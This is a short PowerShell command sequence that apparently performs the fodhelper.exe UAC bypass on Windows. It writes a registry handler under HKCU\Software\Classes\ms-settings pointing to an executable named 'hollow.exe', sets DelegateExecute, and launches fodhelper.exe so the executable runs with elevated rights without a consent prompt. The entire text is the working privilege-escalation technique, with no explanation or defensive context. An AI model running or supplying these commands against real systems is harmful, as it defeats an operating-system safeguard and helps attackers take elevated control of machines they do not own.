New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "c:\users\vic\desktop\hollow.exe" –Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

C:\Windows\System32\fodhelper.exe
